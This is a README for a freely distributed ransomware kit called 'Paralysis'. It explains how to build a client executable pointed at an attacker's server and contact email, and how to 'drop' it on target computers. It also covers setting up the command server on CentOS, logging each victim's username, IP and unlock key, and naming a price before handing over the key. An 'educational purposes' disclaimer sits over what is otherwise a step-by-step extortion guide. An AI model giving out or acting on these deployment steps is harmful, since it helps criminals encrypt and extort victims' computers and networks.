# Paralysis
Free ransom tool (written in C++ and Python)

# DISCLAIMER

This tool is capable of causing damage to computers, 
computer networks, and the operators thereof. This tool was 
created for educational purposes. Illegal use of this tool 
and its variants is not encouraged by its author. The end-user 
is solely responsible for any use(legal or illegal) of this 
tool and/or its variants. By using this tool, you accept the 
reponsibity of ethical use.


HOW TO SETUP @the.red.team's RANSOM TOOL FOR FREE!!!!! 

	                            __           _     
	    ____  ____ __________ _/ /_  _______(_)____
	   / __ \/ __ `/ ___/ __ `/ / / / / ___/ / ___/
	  / /_/ / /_/ / /  / /_/ / / /_/ (__  ) (__  ) 
	 / .___/\__,_/_/   \__,_/_/\__, /____/_/____/  
	/_/                       /____/              


			Developed By: 

   ______  __  __                         __ __                     
  / ____ \/ /_/ /_  ___    ________  ____/ // /____  ____ _____ ___ 
 / / __ `/ __/ __ \/ _ \  / ___/ _ \/ __  // __/ _ \/ __ `/ __ `__ \
/ / /_/ / /_/ / / /  __/ / /  /  __/ /_/ // /_/  __/ /_/ / / / / / /
\ \__,_/\__/_/ /_/\___(_)_/   \___/\__,_(_)__/\___/\__,_/_/ /_/ /_/ 
 \____/                                                             


IMPORTANT:
THIS IS A FREE RANSOM TOOL AND I HOPE YOU ENJOY IT AND THAT IT MEETS YOUR EXPECTATIONS.
KEEPING IN MIND THE FACT THAT IT IS FREE, THIS IS NOT THE MOST COMPLEX RANSOM AND THE PRIVATE VERSION IS NOT TO BE RELEASED.

I AM NOT RESPONSIBLE FOR HOW THIS TOOL IS USED BY INDIVIDUALS OTHER THAN MYSELF. THIS PROJECT WAS CREATED FOR EDUCATIONAL PURPOSES
AND ANY USE BEYOND SAID PURPOSE IS NOT CONDONED BY @the.red.team. ANY AND ALL USERS ACCEPT FULL RESPONSIBILITY FOR THEIR ACTIONS.

You will need to rent one server
The command server can have whatever you'd like

======================SETTING UP THE RANSOM CLIENT======================
Run ParalysisSetup.exe
Enter the ip address of the server where the victims will connect
Enter the email address for the victims to contact(cannot be longer that 30 characters including the domain e.g. aaaaaaaaaaaaaaaaaaaa@gmail.com)
The setup tool will output the paralysis.exe which you can rename and start dropping on target computers

Once the Setup tool creates paralysis.exe, it is ready to be put on targets


======================TYPES OF SERVERS TO TRY FOR======================

TRY TO MAKE IT SO THE SERVER HAS CENTOS 6.* (This setup is tailored for that OS)
If this is impossible, you will have to replace "yum" with "apt-get"

======================WHERE TO PUT FILES======================

Files to put on your command server: server.py

======================SETTING UP COMMAND SERVER======================

command: cd ~/
command: sudo yum install python -y
command: sudo yum install yum-utils -y
command: sudo yum-builddep python -y
command: sudo yum install screen -y
command: sudo yum install python-devel -y
command: sudo yum install epel-release -y
command: sudo yum install python-pip -y

copy the server code to your server in ~/ if you haven't already

command: nano server.py

Press: Ctrl+W
type: logins and hit enter (this will search for "logins")
Create your own admin logins (After you run the server and login, you will be able to create more admin accounts from the terminal)

Press: Ctrl+W
type: port2 = and hit enter
Enter the port you want users to connect to (Cant be the same as your bot port)

Press: Ctrl+X
Press: Y
Press: Enter

Command: screen python server.py
Press: Ctrl+A
Press: D

YOUR SERVER IS SET UP AND IT IS RUNNING WAITING FOR BOTS AND CLIENTS!

=====================================================================ACCESSING YOUR SERVER AS A CLIENT OR ADMINISTRATOR=====================================================================
victim and ransom information will be stored in ransomList.txt
Here you can view the victim's username, computername, IP addr, and the key to deactivate their client.

Once the victim contacts you, you can name your prince whether it is money, or a vid, or whatever. After the ransom is paid, you can provide them with the key

DM ME ANY QUESTIONS
